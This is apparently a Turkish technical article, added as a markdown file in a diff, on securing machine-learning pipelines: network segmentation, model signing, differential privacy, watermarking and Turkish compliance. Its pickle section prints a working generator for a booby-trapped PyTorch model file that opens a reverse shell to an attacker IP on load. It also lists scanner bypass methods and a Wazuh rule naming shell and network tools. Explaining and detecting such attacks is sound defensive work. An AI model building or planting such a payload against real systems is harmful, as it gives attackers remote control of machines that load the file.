@@ -1,0 +1,395 @@
+# **Kurumsal Altyapılarda SecMLOps ve Yapay Zeka DevSecOps Güvenlik Mimarisi: Savunma Derinliği Yaklaşımı**
+
+Yapay zeka ve makine öğrenmesi (ML) sistemlerinin kurumsal altyapılara entegrasyonu, geleneksel yazılım tedarik zinciri ve veri güvenliği sınırlarını temelden değiştirmiştir1. Geleneksel siber güvenlik mimarileri, statik kod analizi ve bilinen zafiyet veri tabanları üzerinden koruma sağlarken; makine öğrenmesi operasyonları (MLOps), dinamik veri kümeleri, opak (uninspectable) model ağırlıkları ve yürütülebilir serileştirme formatları nedeniyle benzersiz tehdit vektörlerine maruz kalmaktadır2.  
+Güvenli Makine Öğrenmesi Operasyonları (SecMLOps veya AI DevSecOps), yapay zeka sistemlerinin yaşam döngüsü boyunca bütünlük, gizlilik ve kullanılabilirlik standartlarını korumayı amaçlayan proaktif bir güvenlik yaklaşımı sunmaktadır1. Bu doğrultuda, kurumsal altyapılarda "Savunma Derinliği" (Defense in Depth) prensiplerine uygun bir siber güvenlik mimarisinin kurgulanması, hem uluslararası standartlar (NIST SP 800-53, ISO 27001, CIS Controls) hem de yerel mevzuatlar (KVKK, BDDK Bilgi Sistemleri Yönetmeliği, 5651 Sayılı Kanun) açısından zorunlu bir gereklilik haline gelmiştir5.
+
+## **Kurumsal Altyapılarda SecMLOps Savunma Derinliği Topolojisi**
+
+Makine öğrenmesi modellerinin eğitiminden çıkarım aşamasına kadar geçen süreçlerin güvenliğini sağlamak için, kurumsal ağ topolojisinin sıkı bir şekilde bölümlendirilmesi (network segmentation) ve her katmanda farklı bir koruma mekanizmasının konumlandırılması gerekmektedir1. Aşağıdaki diyagram, kurumsal bir SecMLOps altyapısının savunma derinliği mimarisini ve bileşenler arasındaki veri akışını göstermektedir:  
+\+-------------------------------------------------------------------------------------------------+  
+| DIŞ DÜNYA / GÜVENSİZ ALAN | | \[ Kamu açık Model Depoları \] (Hugging Face vb.) \[ Dış Veri Kaynakları \] (Web Scraping vb.)| \+-------------------------------------------------------------------------------------------------+ │ ▼ (HTTPS / TLS 1.3) \+-------------------------------------------------------------------------------------------------+  
+| DMZ / SINIR GÜVENLİK KATMANI | | \[ SSL/TLS Sonlandırma & DLP Gateway \] \<--\> \[ Kurumsal Giden Vekil Sunucu (Outbound Proxy) \] | | (Shadow AI engelleme ve veri sızıntısı kontrolü) (Sadece onaylı dış repolara erişim izni) | \+-------------------------------------------------------------------------------------------------+ │ ▼ (İç Güvenlik Duvarı / IPS) \+-------------------------------------------------------------------------------------------------+  
+| KURUMSAL GÜVENLİ MLOPS ALANI | | | | \+-------------------------------------+ \+---------------------------------------+ | | | MİS SAFETENSORS ALT AĞI | | GÜVENLİ EĞİTİM ALT AĞI | | | | \[ ModelScan & SafePickle Tarayıcı \]| | \[ İzole GPU Kümesi (Air-gapped GPU)\] | | | | (Zararlı kod ve backdoor tespiti) | | \[ Opacus / DP-SGD Motoru \] | | | \+-------------------------------------+ \+---------------------------------------+ | | │ ▲ | | ▼ (Onaylı Varlık Aktarımı) │ (Veri Okuma) | | \+-----------------------------------------------------------------------+-------------------+ | | | \[ Yerel Model Kayıt Defteri / Private OCI Registry \] \<--\> \[ Şifreli Veri Gölü (Data Lake) \]| | | | (Harbor/Nexus \- Cosign ile imzalanmış model imajları) (AES-256 ve AWS KMS/HashiCorp) | | | \+-------------------------------------------------------------------------------------------+ | \+-------------------------------------------------------------------------------------------------+ │ ▼ (Cosign Doğrulama Kapısı \- Admission Controller) \+-------------------------------------------------------------------------------------------------+  
+| ÜRETİM / ÇIKARIM (INFERENCE) ALANI | | | | \[ API Gateway \] \--\> \[ Kubernetes Çıkarım Podları (KServe / Triton Inference Server) \] | | (Hız Sınırlama) (Auditd Ajanları & Wazuh Syslog Entegrasyonu ile Çalışma Zamanı İzleme) | \+-------------------------------------------------------------------------------------------------+ │ (Güvenlik Logları) ▼ \+-------------------------------------------------------------------------------------------------+  
+| GÜVENLİK OPERASYONLARI (SOC) | | \[ Wazuh Manager & SIEM \] \<--\> \[ Kriptografik Zaman Damgası Sunucusu \] (5651 Uyumlu Log Deposu) | \+-------------------------------------------------------------------------------------------------+  
+Bu topolojide, dış dünyadan alınan tüm makine öğrenmesi varlıkları doğrudan üretim ortamına veya eğitim sunucularına aktarılamaz9. DMZ katmanında konumlandırılan kurumsal giden vekil sunucu (Outbound Proxy) ve Veri Sızıntısı Önleme (DLP) ağ geçitleri, çalışanların yetkisiz yapay zeka servislerini kullanmasını (Gölge Yapay Zeka \- Shadow AI) engellemekle görevlidir10.  
+Dışarıdan gelen modeller öncelikle "Mis Safetensors Alt Ağı" üzerinde izole edilerek statik ve dinamik taramalardan geçirilir9. Tarama sonrasında onaylanan modeller, yerel OCI kayıt defterine (Private OCI Registry) aktarılır ve burada Cosign ile imzalanır12. Çıkarım (inference) aşamasında, Kubernetes ortamındaki Admission Controller mekanizmaları sadece bu yerel kayıt defterinden gelen ve imzası geçerli olan modellerin ayağa kalkmasına izin verir14.
+
+## **Yapay Zeka Modellerinin Tedarik Zinciri Riskleri ve Sahte/Zehirli Model Tespiti**
+
+Yapay zeka tedarik zincirindeki en büyük tehdit, açık kaynaklı model depolarından kurumsal ağlara sızan zehirli veya kötü amaçlı kod barındıran modellerdir2. Saldırganlar, popüler modellerin benzer isimlerini kullanarak (typosquatting) veya eski hesapları ele geçirerek (namespace hijacking) zararlı modelleri ekosisteme yayabilmektedir9.
+
+### **Pickle Formatının Yapısal Güvenlik Riskleri ve \_\_reduce\_\_ Sömürüsü**
+
+Geleneksel PyTorch modellerinin varsayılan olarak kullandığı pickle (.pt, .pth, .bin) serileştirme formatı, yapısı gereği güvensizdir9. pickle, nesne durumlarını kaydederken ve yüklerken Python kodlarının serileştirilmesine izin verir17. Ters serileştirme (deserialization) anında, Pickle Sanal Makinesi (PVM \- Pickle Virtual Machine) dosya içindeki opcodeları çalıştırır19. Saldırganlar, nesnelerin ters serileştirilmesi sırasında hangi fonksiyonun çağrılacağını belirleyen \_\_reduce\_\_ sihirli metodunu manipüle ederek işletim sistemi seviyesinde rastgele kod çalıştırabilmektedir9.  
+Aşağıdaki Python kodu, bir model dosyası içerisine yerleştirilen ve ters serileştirme anında hedef sunucuda ters kabuk (reverse shell) bağlantısı başlatan saldırgan odaklı bir istismar (exploit) kodunun yapısal mantığını göstermektedir9:
+
+Python  
+import pickle  
+import sys  
+import torch  
+import torch.nn as nn
+
+\# Saldırganın hedef işletim sisteminde çalıştırmak istediği komut  
+\# Bu senaryoda, hedef sunucudan saldırganın kontrolündeki IP adresine ters kabuk açılmaktadır.  
+REVERSE\_SHELL\_PAYLOAD \= "import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(('192.168.142.50',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\['/bin/sh','-i'\]);"
+
+class MaliciousModel(object):  
+    def \_\_reduce\_\_(self):  
+        \# PVM (Pickle Virtual Machine) ters serileştirme anında exec() fonksiyonunu   
+        \# REVERSE\_SHELL\_PAYLOAD argümanı ile çalıştıracaktır.  
+        return (eval, (f"exec(\\"{REVERSE\_SHELL\_PAYLOAD}\\")",))
+
+\# Sahte model nesnesinin oluşturulması  
+malicious\_payload \= MaliciousModel()
+
+\# Zararlı pickle verisinin bir PyTorch model dosyasıymış gibi kaydedilmesi  
+\# Normal şartlarda torch.save() arkada pickle modülünü kullanır.  
+with open("compromised\_resnet50.pt", "wb") as f:  
+    pickle.dump(malicious\_payload, f)
+
+print("\[+\] Zararlı model 'compromised\_resnet50.pt' başarıyla oluşturuldu.")
+
+Hedef sistemdeki bir veri bilimci veya MLOps boru hattı, torch.load("compromised\_resnet50.pt") komutunu çalıştırdığı anda, herhangi bir ek zafiyet sömürüsüne gerek kalmadan saldırganın komutu hedef sistem üzerinde en yüksek kullanıcı yetkileriyle çalıştırılır9.
+
+### **PickleScan Bypass Teknikleri ve Gelişmiş Tespit Yöntemleri**
+
+Hugging Face ve benzeri platformlar, yüklenen modellerdeki güvensiz pickle yapılarını engellemek için statik analiz araçları (örneğin PickleScan) kullanmaktadır9. Ancak PickleScan gibi araçlar, imza tabanlı ve kara liste odaklı çalıştıkları için gelişmiş bypass tekniklerine karşı savunmasızdır17. Sektörde tespit edilen önemli bypass yöntemleri şunlardır17:
+
+* **CVE-2025-10155 (Alternatif Uzantı Manipülasyonu):** Tarayıcıların varsayılan olarak incelemediği dosya uzantılarının kullanılması yoluyla denetim mekanizmalarının atlatılması17.  
+* **CVE-2025-10156 (ZIP CRC Hata Yönetimi):** PyTorch modellerinin paketlendiği ZIP arşivlerindeki CRC (Cyclic Redundancy Check) hata ayıklama algoritmalarındaki boşlukları kullanarak zararlı bytecode bloklarının taranmasını engelleme17.  
+* **CVE-2025-10157 (Dinamik Modül Sınıflandırması):** Doğrudan çağrılmayan güvensiz fonksiyonların, Python'un dinamik kütüphane yolları altına gizlenerek kara liste eşleşmelerinin aşılması17.
+
+Bu zafiyetleri gidermek amacıyla, statik ve dinamik taranabilirliği artırılmış sistemler tasarlanmalıdır11. Örneğin, SafePickle kütüphanesi, pickle dosyalarından çıkartılan işlem kodlarını (opcode) statik olarak çıkarıp anlamsal bir vektöre dönüştürür11. Ardından denetimli (CatBoost, Random Forest) ve denetimsiz (Isolation Forest) makine öğrenmesi algoritmaları ile bu opcodeların normal kullanım dışı (anomali) olup olmadığını analiz ederek sıfırıncı gün bypass tekniklerini %90'ın üzerinde başarı oranıyla tespit eder11.  
+Kurumsal SecMLOps boru hatlarında, açık kaynaklı ModelScan aracı CI/CD entegrasyonu ile konumlandırılmalı ve modeller üretim ortamına dağıtılmadan önce otomatik olarak taranmalıdır18.
+
+### **SOC İzleme ve Olay Müdahale: Linux Auditd ve Wazuh Entegrasyonu**
+
+Model dosyalarının sisteme yüklenmesi ve çalıştırılması anındaki işletim sistemi seviyesindeki anormallikler, siber güvenlik operasyon merkezleri (SOC) tarafından kesintisiz izlenmelidir1. Model sunucularında (KServe, Triton vb.) çalıştırılan tüm alt süreçler Linux Auditd mimarisi ile kayıt altına alınır ve Wazuh SIEM sistemine aktarılır8.
+
+#### **Model Sunucusu Auditd Yapılandırması (/etc/audit/rules.d/secmlops.rules)**
+
+# **Python süreçlerinin başlattığı tüm yürütme (execve) sistem çağrılarını izle**
+
+\-a always,exit \-F arch=b64 \-S execve \-F auid\>=1000 \-F auid\!=4294967295 \-k secmlops\_exec \-a always,exit \-F arch=b32 \-S execve \-F auid\>=1000 \-F auid\!=4294967295 \-k secmlops\_exec
+
+#### **Wazuh Algılama Kuralları (/var/ossec/etc/rules/local\_rules.xml)**
+
+Aşağıdaki özel kural, model çıkarım sunucularında çalışan Python süreci altından beklenmedik bir kabuk (sh, bash) veya ağ aracı (nc, ncat) başlatıldığında en yüksek öncelikli (Level 12\) alarmı tetikler8:
+
+XML  
+\<group name\="audit,secmlops\_detection,"\>  
+  \<\!-- Auditd yürütme olaylarını yakalayan ana kural \--\>  
+  \<rule id\="115100" level\="3"\>  
+    \<if\_sid\>80792\</if\_sid\>  
+    \<field name\="audit.key"\>secmlops\_exec\</field\>  
+    \<description\>Auditd: Sistem üzerinde komut yürütme işlemi algılandı.\</description\>  
+  \</rule\>
+
+  \<\!-- Python altından tetiklenen yetkisiz alt süreçlerin tespiti \--\>  
+  \<rule id\="115101" level\="12"\>  
+    \<if\_rule\>115100\</if\_rule\>  
+    \<field name\="audit.ppid\_name"\>python|python3|gunicorn|uvicorn|triton\</field\>  
+    \<field name\="audit.exe"\>/usr/bin/bash|/usr/bin/sh|/usr/bin/nc|/usr/bin/ncat|/usr/bin/curl|/usr/bin/wget\</field\>  
+    \<description\>KRİTİK ALARM: Model yükleme işlemi sırasında Python süreci altından şüpheli kabuk/ağ komutu tetiklendi\! Olası Pickle Ters Serileştirme (Backdoor) Saldırısı.\</description\>  
+    \<mitre\>  
+      \<id\>AML.T0010\</id\>  
+    \</mitre\>  
+  \</rule\>  
+\</group\>
+
+## **Model İmzalama, Veri Kümesi Bütünlük Doğrulaması ve Eğitim Hatlarının Güvenliği**
+
+Makine öğrenmesi modellerinin eğitim aşamasından üretim aşamasına kadar bozulmadığından ve sadece yetkilendirilmiş kaynaklardan geldiğinden emin olmak için uçtan uca kriptografik bütünlük doğrulama mekanizmaları kurulmalıdır3.
+
+### **OpenSSF Model Signing (OMS) Standardı ve Mimarisi**
+
+Açık Kaynak Güvenlik Vakfı (OpenSSF) Yapay Zeka/ML Güvenliği Çalışma Grubu tarafından duyurulan OpenSSF Model Signing (OMS) standardı, büyük boyutlu makine öğrenmesi yapıtlarının (artifacts) bütünlüğünü doğrulamak üzere geliştirilmiş bütünsel bir mimaridir22.  
+OMS, her bir dosyayı tek tek imzalamak yerine, tüm model klasörünü kapsayan bir mimari sunar22:  
+\[ Model Klasörü \] (bert-base-uncased/) ├── model.safetensors ├── config.json └── tokenizer.json │ ▼ (SHA-256 Hashing) \+-------------------------------------------------------+  
+| OMS IN-TOTO MANIFEST GENERATION | | \- model.safetensors: sha256\_hash\_1 | | \- config.json: sha256\_hash\_2 | | \- tokenizer.json: sha256\_hash\_3 | \+-------------------------------------------------------+ │ ▼ (Sarmalama \- DSSE Envelope) \+-------------------------------------------------------+  
+| DSSE (Dead Simple Signing Envelope) | | \[ Payload Type: application/vnd.in-toto+json \] | | \[ Encrypted Signature (KMS / OIDC Key) \] | \+-------------------------------------------------------+ │ ▼ (Dışa Aktarma) \[ model.sig \] (Ayrık / Detached İmza Dosyası)22  
+Bu yapıda üretilen model.sig dosyası, modelin ağırlık dosyalarını bozmadan ve çıkarım motorunun performansını etkilemeden bütünlük denetimi sağlar22.
+
+### **Sigstore, Cosign ve Kimlik Tabanlı (Keyless) İmzalama Teknolojisi**
+
+Geleneksel kod imzalama sistemlerinde anahtar yönetimi en kritik zafiyet noktasıdır; çalınan veya süresi geçen statik özel anahtarlar tüm güven zincirini kırar3. Sigstore ise kurumlara geçici kriptografik anahtarlar (ephemeral keys) kullanarak anahtarsız (keyless) imzalama imkanı tanır15. Bu süreç şu şekilde işler15:
+
+1. **Kimlik Doğrulama:** CI/CD iş hattı veya geliştirici, kurumsal OpenID Connect (OIDC) sağlayıcısı (örneğin Google, GitHub, Microsoft) üzerinden kimliğini doğrular13.  
+2. **Sertifika Talebi:** Sigstore bünyesindeki **Fulcio** Sertifika Otoritesi, OIDC kimlik belgesini doğrular ve sadece 10 dakika geçerli olan, kısa ömürlü bir x509 imzalama sertifikası üretir15.  
+3. **İmzalama ve Kayıt:** Üretilen geçici anahtar çifti ile model manifestosu imzalanır ve atılan imza ile sertifika detayları, kurcalamaya karşı korumalı şeffaflık günlüğü olan **Rekor** ledgerına kaydedilir15. İmza atıldıktan sonra geçici özel anahtar silinir15. Doğrulama yapmak isteyen sistemler, Rekor günlüğünü kontrol ederek imzanın o geçerli zaman diliminde doğru OIDC kimliği tarafından atıldığını teyit eder15.
+
+#### **Kurumsal Model İmzalama Süreci (OMS CLI)**
+
+Yerel sunucuya indirilen bir modelin, kurumsal Google OIDC kimliği ile anahtarsız olarak imzalanması işlemi aşağıdaki komutla başlatılır22:
+
+Bash  
+\# OMS paketinin yüklenmesi  
+pip install model-signing
+
+\# Model klasörünün Sigstore protokolü ile imzalanması  
+model\_signing sign sigstore ./bert-base-uncased \\  
+  \--ignore-paths venv \\  
+  \--ignore-git-paths
+
+Bu komut çalıştırıldığında kullanıcıyı tarayıcı üzerinden kimlik doğrulamaya yönlendirir26. Doğrulama tamamlandıktan sonra dizinde ayrık model.sig dosyası oluşturulur22.
+
+#### **Kurumsal Model Doğrulama Süreci**
+
+Üretim ortamına alınacak modelin imza doğruluğu, çıkarım podları ayağa kalkmadan önce şu şekilde denetlenir22:
+
+Bash  
+model\_signing verify sigstore \\  
+  \--signature ./model.sig \\  
+  ./bert-base-uncased \\  
+  \--identity "mimar@kurum.com" \\  
+  \--identity\_provider "https://accounts.google.com"
+
+Eğer model dosyalarında en ufak bir değişiklik yapılmışsa veya imza geçersizse, doğrulama işlemi başarısız olur ve modelin çalıştırılması engellenir23.
+
+### **Eğitim Veri Kümesi Bütünlük Doğrulaması (Data Lineage & Hashing)**
+
+Eğitim hatlarının (training pipelines) güvenliği sadece model dosyalarıyla sınırlı olmayıp, modelin eğitildiği veri kümelerinin (datasets) bütünlüğünü de kapsamak zorundadır2. Veri zehirleme (data poisoning) saldırılarına (MITRE ATLAS AML.T0018) karşı kurumsal veri gölündeki (Data Lake) veri kümeleri için şu güvenlik kontrolleri uygulanır1:
+
+* **Kriptografik Veri Manifestosu:** Veri kümesini oluşturan her bir veri parçasının (örneğin CSV, Parquet veya görsel dosyaları) SHA-256 hash değerlerini içeren bir veri manifestosu oluşturulur ve bu manifesto OMS standardına uygun olarak imzalanır23.  
+* **Veri Menşei (Data Lineage) Takibi:** Verinin kaynağından alınarak eğitim hattına girmesine kadar geçen tüm süreçler sürüm kontrol sistemleri (DVC \- Data Version Control) ve MLflow meta-veri veri tabanlarında loglanır, verinin değişmezliği (immutability) güvenceye alınır1.
+
+## **Model Hırsızlığı, Sürüm Tersine Çevirme ve Çıkarma Saldırılarına Karşı Defansif Kontroller**
+
+Makine öğrenmesi modelleri, eğitim verilerinin hassas özelliklerini kendi parametrelerinde (ağırlıklarında) saklayabilir28. Saldırganlar, bu modelleri sorgulayarak veya ağırlıklarını ele geçirerek hem veri gizliliğini ihlal edebilir hem de modelin fikri mülkiyetini çalabilir4.
+
+### **Model Inversion ve Model Extraction Saldırı Mekanizmaları**
+
+#### **Model Inversion (Sürüm Tersine Çevirme)**
+
+Saldırganın, hedef modelin ürettiği tahmin çıktılarını (sınıf güven skorları / olasılık dağılımları) tersine analiz ederek modelin eğitiminde kullanılan kişisel veya hassas verileri (örneğin hasta kayıtları, biyometrik fotoğraflar) yeniden yapılandırmasıdır28. Beyaz kutu (white-box) saldırılarında gradyan tabanlı optimizasyon kullanılırken; kara kutu (black-box) senaryolarında modelin sorgu arayüzlerine gönderilen binlerce sistemli sorgu ve olasılık analizleri ile veri sızıntısı gerçekleştirilir30.
+
+#### **Model Extraction (Model Çıkarma)**
+
+Saldırganın, hedef modele çok sayıda yapılandırılmış sorgu gönderip elde ettiği çıktıları kendi eğittiği "vekil modele" (proxy model) etiket olarak beslemesi ve böylece hedef modelin davranışlarını birebir taklit eden sahte bir model üretmesidir4. Bu saldırı, yüksek yatırım maliyetiyle geliştirilen fikri mülkiyetin (IP) çalınmasına yol açar4.
+
+### **Proaktif Savunma: Diferansiyel Gizlilik (Differential Privacy) ve Opacus**
+
+Diferansiyel Gizlilik (DP), bir veri kümesindeki tek bir bireye ait verinin, modelin genel çıktı dağılımını istatistiksel olarak değiştiremeyeceğini matematiksel olarak garanti eden endüstri standardı bir mahremiyet koruma mekanizmasıdır29.  
+Eğitim esnasında Diferansiyel Gizliliği uygulamak amacıyla kullanılan en yaygın yöntem **DP-SGD** (Differentially Private Stochastic Gradient Descent) algoritmasıdır31. DP-SGD, her bir eğitim adımında şu iki temel işlemi gerçekleştirir31:
+
+1. **Gradyan Kırpma (Gradient Clipping):** Her veri örneği için hesaplanan gradyanların ![][image1] normları, önceden belirlenmiş bir ![][image2] maksimum gradyan normu ile sınırlandırılır31.  
+2. **Gürültü Ekleme (Noise Addition):** Kırpılan gradyanların ortalamasına, gizlilik bütçesine (![][image3]) göre kalibre edilmiş Gauss gürültüsü eklenir31.
+
+Bu süreç, modelin bireysel veri noktalarını ezberlemesini (overfitting) engeller ve böylece Model Inversion saldırılarını matematiksel olarak imkansız hale getirir29. Kurumsal derin öğrenme projelerinde bu koruma, Meta tarafından geliştirilen ve PyTorch ile tam entegre çalışan Opacus kütüphanesiyle sağlanır31.  
+Opacus bünyesindeki **Ghost Clipping** teknolojisi, her bir örnek için gradyanları bellekte oluşturmaya gerek kalmadan doğrudan aktivasyonlar üzerinden gradyan normunu hesaplayarak, standart DP-SGD'nin yol açtığı bellek kullanım artışını %95 oranında azaltır32.
+
+### **PyTorch ve Opacus ile Diferansiyel Gizlilik Uygulaması**
+
+Aşağıdaki kurumsal Python kodu, Ghost Clipping modunu aktif hale getirerek kurumsal bir derin öğrenme modelini diferansiyel gizlilik prensiplerine uygun olarak eğitmektedir31:
+
+Python  
+import numpy as np  
+import torch  
+import torch.nn as nn  
+import torch.optim as optim  
+from torch.utils.data import DataLoader, TensorDataset  
+from opacus import PrivacyEngine
+
+\# 1\. Eğitim Veri Kümesinin ve Modelin Oluşturulması  
+\# 1000 örnekten oluşan, 10 boyutlu girdi ve ikili sınıflandırma hedefi  
+X\_data \= torch.randn(1000, 10)  
+y\_data \= torch.randint(0, 2, (1000,))  
+dataset \= TensorDataset(X\_data, y\_data)  
+train\_loader \= DataLoader(dataset, batch\_size=32, shuffle=True)
+
+\# Kurumsal sınıflandırma modeli mimarisi  
+class EnterpriseModel(nn.Module):  
+    def \_\_init\_\_(self):  
+        super(EnterpriseModel, self).\_\_init\_\_()  
+        self.fc1 \= nn.Linear(10, 16)  
+        self.relu \= nn.ReLU()  
+        self.fc2 \= nn.Linear(16, 2)
+
+    def forward(self, x):  
+        return self.fc2(self.relu(self.fc1(x)))
+
+model \= EnterpriseModel()  
+optimizer \= optim.SGD(model.parameters(), lr=0.05)  
+criterion \= nn.CrossEntropyLoss()
+
+\# 2\. PrivacyEngine (Diferansiyel Gizlilik Motoru) Tanımlanması  
+privacy\_engine \= PrivacyEngine()
+
+\# Bileşenlerin Diferansiyel Gizlilik Standartlarına Göre Dönüştürülmesi  
+\# Ghost Clipping modu aktif edilerek bellek tüketimi optimize edilmiştir.  
+model, optimizer, train\_loader \= privacy\_engine.make\_private(  
+    module=model,  
+    optimizer=optimizer,  
+    data\_loader=train\_loader,  
+    noise\_multiplier=1.1,     \# Gauss gürültüsünün standart sapma katsayısı \[cite: 33\]  
+    max\_grad\_norm=1.0,        \# Maksimum gradyan norm kırpma eşiği \[cite: 33\]  
+    criterion=criterion,  
+    grad\_sample\_mode="ghost"  \# Bellek optimizasyonu için Ghost Clipping \[cite: 32, 33\]  
+)
+
+\# 3\. Diferansiyel Gizlilik Korumalı Model Eğitimi  
+epochs \= 3  
+delta \= 1e-5 \# İzin verilen gizlilik ihlali olasılığı (Genellikle 1/örnek\_sayısı'ndan küçük seçilir)
+
+print("\[+\] Diferansiyel Gizlilik korumalı kurumsal eğitim başlatılıyor...")  
+for epoch in range(epochs):  
+    model.train()  
+    epoch\_loss \= \[\]  
+      
+    for x\_batch, y\_batch in train\_loader:  
+        optimizer.zero\_grad()  
+        outputs \= model(x\_batch)  
+        loss \= criterion(outputs, y\_batch)  
+        loss.backward()  
+        optimizer.step()  
+        epoch\_loss.append(loss.item())  
+          
+    \# Her epok sonunda tüketilen gizlilik bütçesinin (Epsilon) sorgulanması  
+    epsilon, best\_alpha \= optimizer.privacy\_engine.get\_privacy\_spent(delta)  
+    print(f"Epoch: {epoch \+ 1} | Ortalama Kayıp: {np.mean(epoch\_loss):.4f} | Spent Epsilon: {epsilon:.2f} (Delta: {delta})")
+
+### **Model Filigranlama (Model Watermarking) Teknikleri**
+
+Eğitilen modellerin çalınması durumunda mülkiyet haklarının yasal olarak kanıtlanabilmesi amacıyla, model ağırlıklarının içine görünmez izler yerleştirilmelidir34. Bu alandaki temel yaklaşımlar şunlardır34:
+
+* **Arka Kapı Tabanlı Filigranlama (Backdoor Watermarking):** Modelin eğitim kümesine, normal veri dağıtımının dışındaki (out-of-distribution) "tetikleyici" görseller veya veriler yerleştirilir ve bu verilere kasıtlı olarak anlamsız etiketler atanır34. Model çalındığında, mülkiyet sahibi bu tetikleyici verileri kullanarak modelin olağan dışı tahminlerini gösterir ve sahipliğini kanıtlar34.  
+* **Dağılım İçi Filigranlama (In-distribution Watermarking \- IWE):** Geleneksel arka kapı filigranlarının saldırganlar tarafından fark edilip silinmesini (watermark removal) engellemek için, filigran verisini doğrudan ana eğitim verilerinin istatistiksel dağılımı içine gizleyen ve tespiti imkansız kılan gelişmiş bir yöntemdir35.  
+* **GCM'ler İçin CodeGuard Mimarisi:** Kod üreten yapay zeka modelleri (Generative Code Models) için, dikkat mekanizmaları (attention mechanism) ile belirlenen kritik olmayan değişken isimlerinde homograf karakter değişiklikleri yaparak, kod çıktısının içine görünmez ve silinemez filigranlar yerleştiren bütünsel bir koruma yöntemidir36.
+
+## **Uluslararası Güvenlik Standartları ve Türkiye Mevzuat Entegrasyonu**
+
+Tasarlanan SecMLOps mimarisi, kurumsal yönetim süreçleriyle ve yerel mevzuatlarla uyumlu olmak zorundadır5.
+
+### **NIST AI RMF ve MITRE ATLAS Çerçevelerinin Entegrasyonu**
+
+Kurumsal yapay zeka risk yönetimi, NIST AI RMF ve MITRE ATLAS çerçevelerinin ortak kullanımı ile operasyonelleştirilir38:
+
+* **NIST AI RMF:** Güvenlik ekiplerine ortak bir risk taksonomisi sunar5. **Govern** (Yönet) işleviyle kurumsal yapay zeka politikaları belirlenir, **Map** (Haritalandır) işleviyle tüm yapay zeka varlıklarının ve veri akışlarının envanteri çıkartılır, **Measure** (Ölç) işleviyle yapay zekaya özgü saldırı kalıpları test edilir ve **Manage** (Yönet) işleviyle bu risklere karşı aktif korumalar atanır5.  
+* **MITRE ATLAS:** Yapay zekaya yönelik gerçek dünya saldırı tekniklerini (TTPs) içerir38. SecMLOps ekipleri, ATLAS matrisindeki teknikleri kullanarak (örneğin *AML.T0012: Invert AI Model* veya *AML.T0013: Extract AI Model*) sızma testleri simüle eder ve tespit kuralları yazar27.
+
+### **Uluslararası Standartlar Kontrol Eşleştirmesi**
+
+Aşağıdaki tablo, makine öğrenmesi güvenlik tehditlerini uluslararası bilgi güvenliği standartlarındaki (NIST SP 800-53, ISO/IEC 27001:2022, CIS Controls v8) kontrol maddeleriyle eşleştirmektedir:
+
+| SecMLOps Tehdit Vektörü | NIST SP 800-53 Rev. 5 Kontrolü | ISO/IEC 27001:2022 Kontrolü | CIS Controls v8 Kontrol Maddesi | Teknik Çözüm Karşılığı |
+| :---- | :---- | :---- | :---- | :---- |
+| **Model Zehirlenmesi / Kötü Amaçlı Pickle** | SI-7 (Software, Firmware, and Information Integrity) | A.8.19 (Operational software installation) | Control 2 (Inventory and Control of Software Assets) | ModelScan taraması, Safetensors formatı standardizasyonu9. |
+| **Model Tedarik Zinciri İhlali** | SA-12 (Supply Chain Protection) | A.5.19 \- A.5.23 (Supplier relationships) | Control 15 (Service Provider Management) | OpenSSF Model Signing (OMS) ve Sigstore anahtarsız imzalama15. |
+| **Model Inversion / Veri Sızıntısı** | SC-28 (Protection of Information at Rest) | A.8.24 (Use of cryptography) | Control 3 (Data Protection) | Opacus ile Diferansiyel Gizlilik (DP-SGD) eğitimi28. |
+| **Yetkisiz Gölge Yapay Zeka Kullanımı** | AC-3 (Access Enforcement) | A.8.12 (Data leakage prevention) | Control 9 (Email and Web Browser Defenses) | SSL/TLS Deşifre destekli giden vekil sunucu ve DLP sistemleri10. |
+
+### **Türkiye Yasal Mevzuatlarına Uyum Gereksinimleri**
+
+#### **KVKK (6698 Sayılı Kanun) Uyum Analizi**
+
+Kişisel Verileri Kuruma (KVKK) tarafından yayınlanan "Yapay Zekâ Alanında Kişisel Verilerin Korunmasına Dair Tavsiyeler" ve "Üretken Yapay Zekâ ve Kişisel Verilerin Korunması Rehberi" kurumsal ortamlarda sıkı bir denetim gerektirir7.
+
+* **Gölge Yapay Zeka (Shadow AI) Engelleme:** Çalışanların kurumsal verileri veya müşterilere ait kişisel verileri, bilgi işlem departmanının kontrolü dışındaki harici üretken yapay zeka sistemlerine göndermesi KVKK kapsamında veri ihlali suçudur10. Altyapıda, kurumsal DLP kuralları ile bu veri akışları kesintisiz olarak engellenmelidir10.  
+* **Yanılsama (Hallucination) ve Automation Bias Yönetimi:** Yapay zeka çıktılarının doğruluğu her zaman garanti edilemediği için, kararların doğrudan yapay zeka tarafından verilmesi (automation bias) engellenmeli, sistem "insan denetimi" (Human-in-the-Loop) altında çalıştırılmalıdır10.
+
+#### **5651 Sayılı Kanun Kapsamında Log Güvenliği**
+
+Kurumsal SecMLOps altyapısındaki tüm erişimler, model indirme talepleri ve doğrulama logları, 5651 sayılı kanunun gereksinimlerine uygun olarak RFC 3161 standartlarında zaman damgasıyla imzalanarak en az iki yıl boyunca saklanmalıdır1. Bu loglar, olası bir veri ihlali veya sistem sabote edilmesi durumunda adli bilişim analizi için yasal delil niteliğindedir1.
+
+#### **BDDK Bilgi Sistemleri Yönetmeliği ve Finans Güvenliği**
+
+BDDK Bilgi Sistemleri Uyum Daire Başkanlığı standartları finans sektöründe yapay zekanın sınırlarını net çizmiştir43.
+
+* **Yapay Zeka Komiteleri ve Algoritmik Denetim:** Bankalarda kullanılan kredi skoru belirleme veya risk değerlendirme modellerinin tarafsız ve denetlenebilir olması için özel "Yapay Zeka Komiteleri" kurulmalı ve modeller periyodik olarak denetlenmelidir6.  
+* **Veri Egemenliği (Data Sovereignty):** Bankacılık verilerinin ve müşteri sırlarının yurt dışındaki bulut platformlarına aktarılması BDDK tarafından yasaklanmıştır43. Bu nedenle finans kuruluşları, yapay zeka modellerini kendi yerel veri merkezlerindeki (on-premise) izole Kubernetes kümelerinde koşturmalı ve yerel OCI model kayıt defterlerini kullanmalıdır43.
+
+## **SecMLOps Olay Müdahale Planı (NIST SP 800-61 Rev. 2 Uyumlu)**
+
